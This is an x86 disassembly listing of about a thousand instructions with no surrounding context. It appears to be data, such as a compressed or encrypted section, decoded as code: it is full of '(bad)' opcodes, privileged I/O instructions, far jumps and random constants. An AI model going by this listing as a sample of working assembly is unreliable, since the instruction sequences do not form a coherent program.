  422c96:	popf   
  422c97:	or     DWORD PTR [ebx-0x64dadbf9],esp
  422c9d:	cdq    
  422c9e:	mov    bl,0xf5
  422ca0:	and    al,0xc
  422ca2:	scas   eax,DWORD PTR es:[edi]
  422ca3:	sahf   
  422ca4:	pop    ds
  422ca5:	in     eax,dx
  422ca6:	inc    ecx
  422ca7:	xor    esp,esp
  422ca9:	push   es
  422caa:	shr    bl,1
  422cac:	imul   edi,DWORD PTR [ecx+0x26],0xffffffb5
  422cb0:	mov    ds:0x997a8c1e,al
  422cb5:	div    BYTE PTR [eax]
  422cb7:	outs   dx,BYTE PTR ds:[esi]
  422cb8:	loope  0x422cde
  422cba:	push   esp
  422cbb:	and    al,0xbb
  422cbd:	frstor [edi+0x1a]
  422cc0:	push   cs
  422cc1:	jbe    0x422d22
  422cc3:	into   
  422cc4:	fdivr  DWORD PTR [ebx]
  422cc6:	nop
  422cc7:	jg     0x422cdb
  422cc9:	mov    ?,WORD PTR [ecx+0x70]
  422ccc:	nop
  422ccd:	jmp    0xd471:0xef2a49d2
  422cd4:	xchg   ebp,eax
  422cd5:	push   edx
  422cd6:	xlat   BYTE PTR ds:[ebx]
  422cd7:	xlat   BYTE PTR ds:[ebx]
  422cd8:	adc    al,0xf8
  422cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cdb:	(bad)
  422ce0:	inc    ecx
  422ce1:	push   0x3d
  422ce3:	sbb    BYTE PTR [esi],dh
  422ce5:	jmp    0xda11ba6
  422cea:	adc    BYTE PTR [ebp+0x6f],dh
  422ced:	test   edx,eax
  422cef:	adc    DWORD PTR [edx-0x310650c4],esp
  422cf5:	fsub   st,st(5)
  422cf7:	out    dx,eax
  422cf8:	fwait
  422cf9:	xchg   BYTE PTR [ebp-0x76],al
  422cfc:	or     al,0x29
  422cfe:	add    BYTE PTR [ecx+0x75],bl
  422d01:	jl     0x422cdc
  422d03:	setnp  BYTE PTR [ecx-0x1f]
  422d07:	cmp    BYTE PTR [ebx],dh
  422d09:	pop    ss
  422d0a:	nop
  422d0b:	sub    DWORD PTR [esi],ebp
  422d0d:	push   esi
  422d0e:	or     ecx,DWORD PTR [ebp+0x2e07577a]
  422d14:	jmp    0x422cef
  422d16:	dec    edi
  422d17:	dec    edx
  422d18:	int3   
  422d19:	inc    edi
  422d1a:	dec    ebp
  422d1b:	xchg   esp,eax
  422d1c:	ins    DWORD PTR es:[edi],dx
  422d1d:	or     BYTE PTR [eax-0x60],cl
  422d20:	popf   
  422d21:	fs sbb eax,0x70b1d03a
  422d27:	mov    bh,dh
  422d29:	in     eax,dx
  422d2a:	jae    0x422d81
  422d2c:	dec    esi
  422d2d:	jge    0x422cd0
  422d2f:	(bad)  
  422d30:	jae    0x422ce3
  422d32:	ret    
  422d33:	lods   al,BYTE PTR ds:[esi]
  422d34:	pop    esp
  422d35:	rol    BYTE PTR [edx+0xa],cl
  422d38:	and    DWORD PTR [eax+0x54e858ef],ebx
  422d3e:	mov    al,0x75
  422d40:	sbb    ebx,DWORD PTR [edx+edx*2]
  422d43:	push   edx
  422d44:	xchg   ebx,eax
  422d45:	jbe    0x422cde
  422d47:	unpckhps xmm2,xmm1
  422d4a:	adc    DWORD PTR [edx-0x75],ebx
  422d4d:	sbb    edi,DWORD PTR [ebx-0x3f]
  422d50:	dec    edx
  422d51:	fiadd  WORD PTR [ecx+0x66]
  422d54:	cwde   
  422d55:	jns    0x422ce1
  422d57:	jnp    0x422dbd
  422d59:	ins    BYTE PTR es:[edi],dx
  422d5a:	nop
  422d5b:	in     eax,0xe9
  422d5d:	inc    esp
  422d5e:	sti    
  422d5f:	dec    ebx
  422d60:	ins    BYTE PTR es:[edi],dx
  422d61:	pop    ss
  422d62:	pusha  
  422d63:	dec    edx
  422d64:	add    ch,ch
  422d66:	iret   
  422d67:	ret    
  422d68:	pushf  
  422d69:	mov    ebx,0xc99bce0c
  422d6e:	ss pop es
  422d70:	out    dx,al
  422d71:	pop    edx
  422d72:	jne    0x422dca
  422d74:	out    dx,eax
  422d75:	lock adc al,0x53
  422d78:	mov    esp,0x6a70f6dd
  422d7d:	stc    
  422d7e:	push   0x1a
  422d80:	fwait
  422d81:	mov    ch,0xe3
  422d83:	idiv   BYTE PTR [ebp+0x1b]
  422d86:	pop    ebx
  422d87:	xor    eax,0xcb21de2a
  422d8c:	mov    dl,0x60
  422d8e:	cld    
  422d8f:	add    al,0x4d
  422d91:	dec    BYTE PTR [edi-0x6c9cff5f]
  422d97:	sar    BYTE PTR [edi+0x5e],1
  422d9a:	push   edx
  422d9b:	dec    edx
  422d9c:	inc    esi
  422d9d:	sub    al,0x95
  422d9f:	rcl    eax,1
  422da1:	and    ch,BYTE PTR [eax+eiz*4-0x65]
  422da5:	sub    DWORD PTR [edi-0x788f50f5],ecx
  422dab:	ins    DWORD PTR es:[edi],dx
  422dac:	cmp    al,0x53
  422dae:	std    
  422daf:	dec    ecx
  422db0:	mov    al,0xb8
  422db2:	sahf   
  422db3:	sahf   
  422db4:	cmp    bh,al
  422db6:	fisubr WORD PTR [ecx]
  422db8:	fwait
  422db9:	jp     0x422db4
  422dbb:	mov    WORD PTR [eax],fs
  422dbd:	ror    DWORD PTR [edx-0x412224fe],0xd1
  422dc4:	loopne 0x422d97
  422dc6:	js     0x422de8
  422dc8:	rcr    BYTE PTR [esi+0x7a],cl
  422dcb:	inc    edx
  422dcc:	pushf  
  422dcd:	cmp    BYTE PTR [edi+0x77],ch
  422dd0:	loop   0x422dff
  422dd2:	or     DWORD PTR [esi+0x65fd0373],ecx
  422dd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422dd9:	mov    bl,0xfc
  422ddb:	leave  
  422ddc:	mov    dl,0xad
  422dde:	mov    BYTE PTR [ebx+0x4d],bl
  422de1:	pop    ss
  422de2:	fdivr  QWORD PTR [ebp+eiz*1-0x22]
  422de6:	mov    cl,0xa8
  422de8:	jmp    0x76de:0x57029b12
  422def:	add    DWORD PTR [ebx+edx*8],edx
  422df2:	mov    edx,0x904d0961
  422df7:	cmp    al,bl
  422df9:	pop    edi
  422dfa:	jge    0x422d8d
  422dfc:	push   ebx
  422dfd:	xchg   ecx,eax
  422dfe:	mov    cl,BYTE PTR [edx-0x1c]
  422e01:	loop   0x422d8b
  422e03:	pop    ds
  422e04:	dec    eax
  422e05:	xor    BYTE PTR [esi+ebp*1+0x5c8e9213],bh
  422e0c:	fwait
  422e0d:	in     al,0x7b
  422e0f:	xor    eax,0xde526915
  422e14:	push   0x9b2ae01d
  422e19:	dec    ebx
  422e1a:	repnz and eax,0x839c78f6
  422e20:	fwait
  422e21:	daa    
  422e22:	cs xchg ecx,eax
  422e24:	nop
  422e25:	jnp    0x422e10
  422e27:	push   0x49ac50b5
  422e2c:	clc    
  422e2d:	mov    al,0xf
  422e2f:	xchg   DWORD PTR [edx+eiz*1],ebx
  422e32:	inc    esp
  422e33:	adc    ch,BYTE PTR [ecx-0x5b03592]
  422e39:	cmp    edx,DWORD PTR [eax]
  422e3b:	hlt    
  422e3c:	fpatan 
  422e3e:	ins    DWORD PTR es:[edi],dx
  422e3f:	push   0xd95de553
  422e44:	into   
  422e45:	dec    edi
  422e46:	cmp    DWORD PTR [ebx],0xe31ebd1
  422e4c:	fs jg  0x422de0
  422e4f:	pop    ecx
  422e50:	sbb    bh,ch
  422e52:	dec    ebx
  422e53:	sbb    BYTE PTR [edx+0x25],ch
  422e56:	ins    BYTE PTR es:[edi],dx
  422e57:	inc    ebp
  422e58:	jle    0x422e38
  422e5a:	cmp    bl,BYTE PTR [ebx]
  422e5c:	bound  edi,QWORD PTR [edi+eax*4-0x686ecf43]
  422e63:	loope  0x422e7b
  422e65:	jecxz  0x422edf
  422e67:	bound  esi,QWORD PTR [edx+0x78]
  422e6a:	xchg   ecx,eax
  422e6b:	jp     0x422edc
  422e6d:	popf   
  422e6e:	jl     0x422eb6
  422e70:	or     eax,0xbb6644fd
  422e75:	pop    ebp
  422e76:	pop    es
  422e77:	scas   al,BYTE PTR es:[edi]
  422e78:	xor    al,0x8f
  422e7a:	or     DWORD PTR [ebx],eax
  422e7c:	fwait
  422e7d:	adc    DWORD PTR es:[ebp-0x739e46dd],ebp
  422e84:	pop    edx
  422e85:	fistp  QWORD PTR [esi+ecx*1+0x319ef2c9]
  422e8c:	ds ins WORD PTR es:[edi],dx
  422e8f:	mov    al,0xd9
  422e91:	xor    eax,0xe1ce4a21
  422e96:	pop    ebp
  422e97:	(bad)
  422e9b:	dec    edx
  422e9c:	xor    al,0x65
  422e9e:	bound  edx,QWORD PTR [eax]
  422ea0:	mov    dl,0x3a
  422ea2:	jb     0x422e6f
  422ea4:	fwait
  422ea5:	mov    edx,0xa93a5c03
  422eaa:	dec    eax
  422eab:	test   DWORD PTR [edx+0x1c],ecx
  422eae:	gs ret 
  422eb0:	adc    DWORD PTR [ebx+0x7a],ebx
  422eb3:	vpaddusw xmm2,xmm4,XMMWORD PTR [esi+0x3c]
  422eb8:	nop
  422eb9:	mov    eax,ds:0xea21d61e
  422ebe:	or     dl,al
  422ec0:	fwait
  422ec1:	pop    ss
  422ec2:	mov    cl,BYTE PTR [esi]
  422ec4:	imul   eax,DWORD PTR [esi-0x20e9bb47],0x41
  422ecb:	xor    DWORD PTR [edx+0x66],ebp
  422ece:	dec    ebx
  422ecf:	ret    
  422ed0:	aaa    
  422ed1:	retf   0x1cf8
  422ed4:	mov    ecx,0x695db864
  422ed9:	fisubr DWORD PTR [ebx-0x33]
  422edc:	bound  edi,QWORD PTR [ecx]
  422ede:	push   es
  422edf:	and    eax,0xdd15be1f
  422ee4:	nop
  422ee5:	cmp    bl,BYTE PTR [edi-0x9746486]
  422eeb:	pop    ecx
  422eec:	xor    esp,DWORD PTR [ebx+ebx*2]
  422eef:	addr16 test eax,0x867046c0
  422ef5:	pop    esi
  422ef6:	(bad)  
  422ef7:	jge    0x422f2e
  422ef9:	fnstcw WORD PTR [ecx-0x4d16d0b4]
  422eff:	lock mov esp,0xe1326029
  422f05:	ret    0x7390
  422f08:	and    ebp,DWORD PTR [ebp+0x6baa042d]
  422f0e:	fdiv   DWORD PTR [ebx]
  422f10:	push   eax
  422f11:	in     eax,0x57
  422f13:	xchg   DWORD PTR [ecx+edi*4+0x21],esi
  422f17:	call   0xa09b:0xab0e3492
  422f1e:	addr16 out 0xee,al
  422f21:	rcr    DWORD PTR [edx+0x5fddcbc0],0xff
  422f28:	loop   0x422efb
  422f2a:	daa    
  422f2b:	dec    ecx
  422f2c:	cmp    eax,0x70099024
  422f31:	inc    ebp
  422f32:	xchg   ecx,eax
  422f33:	cmc    
  422f34:	leave  
  422f35:	sti    
  422f36:	add    BYTE PTR [ecx-0x55],dl
  422f39:	mov    ebx,0x20e51d3d
  422f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f3f:	lods   eax,DWORD PTR ds:[esi]
  422f40:	inc    ebx
  422f41:	fnsave [ecx-0x39]
  422f44:	fwait
  422f45:	loop   0x422f7e
  422f47:	shl    BYTE PTR [edi+0x2e],0xeb
  422f4b:	and    BYTE PTR [eax-0x22],bh
  422f4e:	mov    al,0x60
  422f50:	xchg   esi,eax
  422f51:	je     0x422f0a
  422f53:	inc    edi
  422f54:	and    al,0x16
  422f56:	nop
  422f57:	mov    bh,bl
  422f59:	sub    cl,BYTE PTR [edx+ecx*8+0x7017a008]
  422f60:	xor    BYTE PTR [edx-0x52],bl
  422f63:	dec    ecx
  422f64:	imul   edx,DWORD PTR [edx-0x57e0e191],0x85755797
  422f6e:	in     eax,dx
  422f6f:	xchg   esi,eax
  422f70:	or     ebp,eax
  422f72:	dec    edi
  422f73:	push   eax
  422f74:	mov    edi,ds
  422f76:	lds    eax,FWORD PTR [ecx+0x7321458f]
  422f7c:	mov    al,ds:0x9b0b5b3d
  422f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f82:	int    0x33
  422f84:	ja     0x422f96
  422f86:	cmc    
  422f87:	mov    ch,0x67
  422f89:	in     eax,dx
  422f8a:	bnd jg 0x422fa5
  422f8d:	mov    ds:0x394bbed0,al
  422f92:	mov    WORD PTR [edi],cs
  422f94:	pushf  
  422f95:	cmp    DWORD PTR [ebx+0x7f608841],edi
  422f9b:	add    BYTE PTR [edx-0x2c9f2962],al
  422fa1:	mov    ebp,0xc69e4a1c
  422fa6:	dec    edx
  422fa7:	mov    WORD PTR [ebp+ebp*4+0x29],es
  422fab:	pushf  
  422fac:	fwait
  422fad:	mov    ecx,0x3cd4d7c0
  422fb2:	lods   al,BYTE PTR ds:[esi]
  422fb3:	mov    dl,0x40
  422fb5:	loopne 0x422f44
  422fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fb8:	(bad)  
  422fb9:	hlt    
  422fba:	add    al,0xd3
  422fbc:	pop    ebx
  422fbd:	adc    BYTE PTR [ebp-0x5b],dh
  422fc0:	sbb    dh,BYTE PTR [edx]
  422fc2:	fcomp  QWORD PTR [esi-0x35aee2a5]
  422fc8:	repnz mul BYTE PTR [edi+eiz*4]
  422fcc:	icebp  
  422fcd:	cwde   
  422fce:	lds    ecx,FWORD PTR [ecx+0x2b]
  422fd1:	out    dx,eax
  422fd2:	pop    edx
  422fd3:	imul   ebp,DWORD PTR [edi-0x64d89e51],0x94c64c2f
  422fdd:	mov    bh,0x8b
  422fdf:	fdivr  st(7),st
  422fe1:	frstor [edx]
  422fe3:	popa   
  422fe4:	xchg   edi,eax
  422fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fe6:	sbb    dl,BYTE PTR [ebx-0x5e]
  422fe9:	mov    bl,0x90
  422feb:	jecxz  0x422ffc
  422fed:	jp     0x42305a
  422fef:	xor    ebx,DWORD PTR [ebp+0x4d]
  422ff2:	pusha  
  422ff3:	dec    edx
  422ff4:	lahf   
  422ff5:	int    0x70
  422ff7:	inc    esp
  422ff8:	les    edi,FWORD PTR es:[ebp-0x2898649d]
  422fff:	sub    eax,0xe0a63ec2
  423004:	adc    ebx,esi
  423006:	inc    edx
  423007:	arpl   ax,sp
  423009:	add    DWORD PTR [eax],esp
  42300b:	cdq    
  42300c:	or     al,BYTE PTR [ecx]
  42300e:	nop
  42300f:	les    edi,FWORD PTR [ebx-0x5c]
  423012:	adc    al,0xcd
  423014:	(bad)  [ecx+ecx*1+0x2c49ff4a]
  42301b:	pop    edx
  42301c:	push   edi
  42301d:	(bad)  
  42301e:	fnstenv [ecx-0x65]
  423021:	js     0x422fd6
  423023:	mov    ebx,0x67caf082
  423028:	sti    
  423029:	frstor [ebp+0x37]
  42302c:	push   ebp
  42302d:	push   ss
  42302e:	mov    edx,0xae46eb48
  423033:	xor    DWORD PTR [esp+ecx*8+0x701d5d90],edi
  42303a:	or     dl,BYTE PTR [edx+ebp*8+0x4f]
  42303e:	mov    al,ds:0x84de1841
  423043:	fwait
  423044:	lods   al,BYTE PTR gs:[esi]
  423046:	stos   BYTE PTR es:[edi],al
  423047:	into   
  423048:	lahf   
  423049:	mov    ebp,0x995e459f
  42304e:	mov    edi,0xa501a9c9
  423053:	push   eax
  423054:	sbb    eax,0x7fc08df
  423059:	or     al,0x8
  42305b:	jno    0x4230be
  42305d:	scas   eax,DWORD PTR es:[edi]
  42305e:	inc    ebp
  42305f:	inc    esi
  423060:	xchg   edx,eax
  423061:	adc    BYTE PTR [eax-0x636a89c7],0xd0
  423068:	dec    edx
  423069:	test   DWORD PTR [esi],0x36de53c0
  42306f:	jmp    0xf8ae7f5f
  423074:	clc    
  423075:	xor    dl,BYTE PTR [eax+0x7d2b70b8]
  42307b:	xor    esi,ebx
  42307d:	pusha  
  42307e:	mov    eax,ds:0xb9e3be66
  423083:	mov    DWORD PTR [edi+0x40828f66],ebx
  423089:	out    0x8f,al
  42308b:	inc    ebp
  42308c:	cmp    al,0x59
  42308e:	jp     0x423062
  423090:	aam    0xe7
  423092:	inc    edi
  423093:	ret    0xddc1
  423096:	mov    esp,0x5a5ffbba
  42309b:	mov    al,0xb0
  42309d:	fcom   DWORD PTR [eax+0x4b51c0dc]
  4230a3:	pop    ds
  4230a4:	retf   0xf96
  4230a7:	mov    dh,ch
  4230a9:	std    
  4230aa:	setns  ah
  4230ad:	mov    al,ds:0xc2833982
  4230b2:	cdq    
  4230b3:	or     dh,BYTE PTR [ecx]
  4230b5:	in     eax,dx
  4230b6:	mov    ebp,0xbb9f07d8
  4230bb:	out    0x89,al
  4230bd:	pop    edx
  4230be:	jl     0x4230e4
  4230c0:	(bad)  
  4230c1:	fst    QWORD PTR [esi]
  4230c3:	not    eax
  4230c5:	cmp    dl,BYTE PTR [edi-0x40]
  4230c8:	ins    BYTE PTR es:[edi],dx
  4230c9:	mov    al,ds:0xae195590
  4230ce:	jecxz  0x4230a7
  4230d0:	sbb    BYTE PTR [esi],cl
  4230d2:	xchg   esp,eax
  4230d3:	dec    ecx
  4230d4:	pop    esi
  4230d5:	lods   al,BYTE PTR ds:[esi]
  4230d6:	es push eax
  4230d8:	adc    bh,BYTE PTR [ebp-0x11644349]
  4230de:	sub    ecx,DWORD PTR [edx-0x7a27ff3f]
  4230e4:	jmp    0x7410:0x7df312dd
  4230eb:	ror    DWORD PTR [ebp+eax*8-0x317c8f6d],1
  4230f2:	out    dx,eax
  4230f3:	push   cs
  4230f4:	cmp    eax,0x3ed70d7e
  4230f9:	fidiv  WORD PTR [ecx+0x5c2f56d9]
  4230ff:	out    0x1d,al
  423101:	dec    esp
  423102:	xor    BYTE PTR [ecx],0x9b
  423105:	mov    dh,0x58
  423107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423108:	mov    edi,0xa0368dba
  42310d:	fisttp QWORD PTR [eax]
  42310f:	push   esp
  423110:	pop    ds
  423111:	sub    dh,BYTE PTR [ecx+ebx*1]
  423114:	imul   si,WORD PTR [esi-0x16],0xd4a7
  42311a:	aam    0x6e
  42311c:	(bad)  
  42311d:	lods   al,BYTE PTR gs:[esi]
  42311f:	dec    ecx
  423120:	adc    BYTE PTR [eax+edi*4-0x53],ah
  423124:	sub    al,0x70
  423126:	push   es
  423127:	addr16 (bad) 
  42312a:	xchg   esi,eax
  42312b:	leave  
  42312c:	imul   edx,ebp,0xffffff83
  42312f:	ffree  st(2)
  423131:	aad    0x8e
  423133:	dec    edx
  423134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423135:	dec    edi
  423136:	outs   dx,BYTE PTR ds:[esi]
  423137:	mov    ds:0x2de0ca35,eax
  42313c:	fwait
  42313d:	int    0xa0
  42313f:	lods   eax,DWORD PTR ds:[esi]
  423140:	sub    dl,ch
  423142:	jmp    0xea49:0xcd8e955a
  423149:	adc    BYTE PTR [ebp+0x79],bh
  42314c:	daa    
  42314d:	icebp  
  42314e:	hlt    
  42314f:	test   DWORD PTR [ebx+0x2b84b15f],ebx
  423155:	call   0xe92ec82a
  42315a:	dec    edx
  42315b:	fdecstp 
  42315d:	push   ecx
  42315e:	xchg   ebx,eax
  42315f:	jbe    0x42310b
  423161:	sub    BYTE PTR [eax],0x96
  423164:	pusha  
  423165:	pop    esi
  423166:	xchg   edx,eax
  423167:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423168:	into   
  423169:	out    dx,al
  42316a:	add    DWORD PTR [ebx-0x47afa343],eax
  423170:	xlat   BYTE PTR ds:[ebx]
  423171:	fcom   QWORD PTR [eax-0x6edae1b4]
  423177:	mov    bl,0x2c
  423179:	push   cs
  42317a:	fisttp QWORD PTR [ecx-0x34]
  42317d:	inc    ebp
  42317e:	fld    QWORD PTR ss:[esi]
  423181:	cdq    
  423182:	sub    al,0xd7
  423184:	fwait
  423185:	imul   edi,DWORD PTR [ecx-0x46],0xffffffd4
  423189:	ret    
  42318a:	adc    eax,0xc060773
  42318f:	push   edi
  423190:	aaa    
  423191:	fisub  WORD PTR [eax+ebp*4]
  423194:	jne    0x423192
  423196:	int    0xe
  423198:	(bad)  
  423199:	lods   al,BYTE PTR ss:[esi]
  42319b:	int    0xfd
  42319d:	mov    WORD PTR [edi+0x69],ss
  4231a0:	(bad)  
  4231a1:	fwait
  4231a2:	xor    BYTE PTR [ebp+0x7b],bh
  4231a5:	es dec edi
  4231a7:	dec    edx
  4231a8:	push   cs
  4231a9:	ret    0x6fe1
  4231ac:	add    BYTE PTR [edx+0x7c],dh
  4231af:	mov    dl,0x18
  4231b1:	jne    0x42316f
  4231b3:	and    BYTE PTR [ecx],0x9c
  4231b6:	nop
  4231b7:	mov    edx,DWORD PTR [ebp*1+0x175e4431]
  4231be:	inc    edx
  4231bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231c0:	imul   esp,DWORD PTR [ecx+0x24],0x4a
  4231c4:	mov    cl,0xdc
  4231c6:	or     eax,0xffffffe1
  4231c9:	retf   0x9448
  4231cc:	xchg   ebp,eax
  4231cd:	mov    WORD PTR [eax-0x976f314],ss
  4231d3:	mov    DWORD PTR [ebp-0x3638dfb3],ebx
  4231d9:	rol    DWORD PTR [ebx-0x5dc46e6e],1
  4231df:	xchg   ecx,eax
  4231e0:	rcr    ch,1
  4231e2:	mov    eax,0x6d856c17
  4231e7:	test   eax,0x9382459b
  4231ec:	xchg   edx,eax
  4231ed:	jmp    0x4231be
  4231ef:	cmc    
  4231f0:	mov    edi,0x454a094e
  4231f5:	cmp    BYTE PTR [ebp+0x5d68a6fb],0xb1
  4231fc:	shufps xmm2,XMMWORD PTR [edx+0x79d3d6b8],0x47
  423204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423205:	cmp    eax,0xe147e343
  42320a:	xchg   edi,eax
  42320b:	dec    eax
  42320c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42320d:	loope  0x423234
  42320f:	push   esi
  423210:	jnp    0x4231c2
  423212:	and    DWORD PTR [edx],edi
  423214:	psubb  mm1,QWORD PTR [edi+0x68b2b734]
  42321b:	stc    
  42321c:	fs sahf 
  42321e:	popf   
  42321f:	gs pop es
  423221:	imul   ebx,DWORD PTR [ebx-0x74],0x47
  423225:	pushf  
  423226:	aam    0x31
  423228:	call   0x87de:0x6560579e
  42322f:	xchg   ebp,eax
  423230:	cmp    eax,DWORD PTR [edi-0x44]
  423233:	adc    eax,0x2d90c817
  423238:	xchg   BYTE PTR [ebx+0x26],ch
  42323b:	mov    gs,esp
  42323d:	and    BYTE PTR [esi],al
  42323f:	dec    edx
  423240:	or     ecx,ebp
  423242:	scas   al,BYTE PTR es:[edi]
  423243:	in     eax,dx
  423244:	ret    
  423245:	lock out dx,eax
  423247:	sahf   
  423248:	mov    ds:0x89cc7993,al
  42324d:	clc    
  42324e:	outs   dx,DWORD PTR ds:[esi]
  42324f:	aad    0xe0
  423251:	xor    esi,esi
  423253:	dec    ecx
  423254:	push   cs
  423255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423256:	jl     0x42322a
  423258:	scas   eax,DWORD PTR es:[edi]
  423259:	mov    es,edi
  42325b:	fist   DWORD PTR [ebx+0x53]
  42325e:	nop
  42325f:	push   DWORD PTR [ebx]
  423261:	dec    edi
  423262:	sub    eax,DWORD PTR [edi]
  423264:	ds dec eax
  423266:	sub    edx,edi
  423268:	es in  eax,0x87
  42326b:	(bad)  
  42326c:	xchg   edi,eax
  42326d:	inc    edx
  42326e:	jb     0x423211
  423270:	add    DWORD PTR ds:0xee9c4bb0,ebp
  423276:	in     al,0x8c
  423278:	mov    eax,0x5bf4af4e
  42327d:	retf   
  42327e:	mov    esi,0xc8004071
  423283:	dec    ecx
  423284:	rcl    bl,0x2e
  423287:	fadd   QWORD PTR [edx-0x64b44946]
  42328d:	fld    DWORD PTR [edi-0x76]
  423290:	pop    ebx
  423291:	mov    esi,0xe530a79e
  423296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423297:	mov    ah,0xbd
  423299:	pushf  
  42329a:	dec    esp
  42329b:	sub    BYTE PTR [ecx+ebp*2-0x70],al
  42329f:	add    al,dh
  4232a1:	mov    edi,0x8b9b17fa
  4232a6:	loop   0x423286
  4232a8:	rol    WORD PTR [ecx-0x1521a57a],0xa1
  4232b0:	loopne 0x42327c
  4232b2:	sub    DWORD PTR [edx-0x31f938be],ecx
  4232b8:	fwait
  4232b9:	mov    ecx,DWORD PTR [eax+0x23]
  4232bc:	fsub   DWORD PTR ds:[ecx-0x2f209642]
  4232c3:	mov    al,0x6f
  4232c5:	adc    DWORD PTR [esp+edi*1-0x6a],eax
  4232c9:	dec    esi
  4232ca:	into   
  4232cb:	mov    dl,0x9b
  4232cd:	mov    dl,0x2a
  4232cf:	xor    dl,BYTE PTR es:[edi]
  4232d2:	sbb    ebx,eax
  4232d4:	stc    
  4232d5:	(bad)  [ebp-0x9674812]
  4232db:	loope  0x4232c4
  4232dd:	jg     0x42326f
  4232df:	add    DWORD PTR [ecx-0x170ab1a2],esi
  4232e5:	adc    al,0x81
  4232e7:	pop    eax
  4232e8:	cs pop esp
  4232ea:	mov    al,0xac
  4232ec:	fwait
  4232ed:	inc    ecx
  4232ee:	loope  0x4232db
  4232f0:	into   
  4232f1:	imul   eax,DWORD PTR [ebx],0x69fa9b8a
  4232f7:	mov    DWORD PTR [ebp-0x45d6285f],edi
  4232fd:	fisub  WORD PTR [eax-0x9]
  423300:	xor    DWORD PTR [edx+0x10],edi
  423303:	cli    
  423304:	icebp  
  423305:	test   eax,0xe2b8ba63
  42330a:	ins    DWORD PTR es:[edi],dx
  42330b:	inc    ebx
  42330c:	pop    ebx
  42330d:	mov    edx,0xa871ddfb
  423312:	cmp    edi,edx
  423314:	sub    dh,bl
  423316:	dec    esp
  423317:	sub    DWORD PTR [eax-0x157cf3a1],edi
  42331d:	mov    edx,0x4ec70200
  423322:	xchg   esi,eax
  423323:	mov    dh,0x9b
  423325:	hlt    
  423326:	jle    0x4232eb
  423328:	add    eax,ecx
  42332a:	ror    BYTE PTR [ecx+0x7],1
  42332d:	mov    dl,0xb2
  42332f:	int3   
  423330:	inc    esi
  423331:	or     DWORD PTR [eax],esp
  423333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423334:	fwait
  423335:	popf   
  423336:	xchg   ebx,eax
  423337:	nop
  423338:	retf   
  423339:	xchg   ecx,eax
  42333a:	mov    al,0x59
  42333c:	sbb    al,0xc0
  42333e:	arpl   WORD PTR [edx+0x66],cx
  423341:	push   edi
  423342:	xchg   esp,eax
  423343:	push   es
  423344:	inc    edi
  423345:	and    al,bh
  423347:	mov    ebp,0x83bd27a2
  42334c:	inc    ebp
  42334d:	xchg   ebp,eax
  42334e:	and    BYTE PTR [esi+ecx*1],dl
  423351:	repnz gs pop ecx
  423354:	call   0x50d6:0xfb4c3759
  42335b:	add    dh,BYTE PTR [esi-0xa576fcb]
  423361:	sub    eax,0xd46057dd
  423366:	xor    ecx,DWORD PTR [ebp+0x7f]
  423369:	xor    dh,BYTE PTR [ecx+0x109e81e3]
  42336f:	je     0x42338a
  423371:	stos   DWORD PTR es:[edi],eax
  423372:	nop
  423373:	shl    BYTE PTR [ebx],0x48
  423376:	call   0x8c5076f7
  42337b:	imul   ebx,DWORD PTR [esi+0x57c9c1bf],0x7a5e5b65
  423385:	inc    eax
  423386:	nop
  423387:	xor    ebp,DWORD PTR [eax-0x7fcc9e8a]
  42338d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42338e:	cmp    DWORD PTR [edi-0x37],esp
  423391:	in     al,0xe7
  423393:	dec    ecx
  423394:	aas    
  423395:	pop    es
  423396:	mov    bl,0xab
  423398:	jmp    0xed42:0x7fa99df6
  42339f:	xchg   ebx,ebx
  4233a1:	dec    eax
  4233a2:	jecxz  0x4233cd
  4233a4:	(bad)  
  4233a5:	iret   
  4233a6:	dec    ebx
  4233a7:	pop    ecx
  4233a8:	dec    edx
  4233a9:	dec    ebp
  4233aa:	jp     0x423382
  4233ac:	mov    ebx,0x2213dd13
  4233b1:	rcl    DWORD PTR [eax-0x1ffffd5e],cl
  4233b7:	jno    0x42341c
  4233b9:	nop
  4233ba:	(bad)
  4233be:	pop    ds
  4233bf:	push   ebx
  4233c0:	fisttp WORD PTR [eax-0x5e647ff3]
  4233c6:	stos   DWORD PTR es:[edi],eax
  4233c7:	dec    ebp
  4233c8:	bound  edx,QWORD PTR [edi]
  4233ca:	pop    esi
  4233cb:	jo     0x423441
  4233cd:	in     eax,0x87
  4233cf:	pop    ebp
  4233d0:	mov    ebp,0xdb081a77
  4233d5:	mov    eax,0x1e92e318
  4233da:	or     eax,0x453bb855
  4233df:	sbb    ebx,DWORD PTR gs:[ecx+0xc08f854]
  4233e6:	loopne 0x423432
  4233e8:	loop   0x4233a9
  4233ea:	scas   al,BYTE PTR es:[edi]
  4233eb:	mov    bh,0x0
  4233ed:	adc    al,0x53
  4233ef:	push   ds
  4233f0:	cmp    BYTE PTR [eax-0x70],ch
  4233f3:	(bad)
  4233f6:	sbb    BYTE PTR [edi+0x4a0234c9],cl
  4233fc:	cdq    
  4233fd:	or     dl,BYTE PTR [ebp-0x7]
  423400:	or     DWORD PTR [eax],esi
  423402:	fld    DWORD PTR [esi]
  423404:	sub    edx,DWORD PTR [ecx]
  423406:	paddq  mm2,QWORD PTR [esp+ebp*4]
  42340a:	nop
  42340b:	mov    edx,0x174964a2
  423410:	lahf   
  423411:	dec    ebp
  423412:	xor    al,0x4a
  423414:	xor    DWORD PTR [edi-0x74],ebp
  423417:	cld    
  423418:	retf   
  423419:	scas   al,BYTE PTR es:[edi]
  42341a:	sbb    al,0x6
  42341c:	fwait
  42341d:	loopne 0x4233c7
  42341f:	es add eax,0x3d257276
  423425:	fsubrp st(0),st
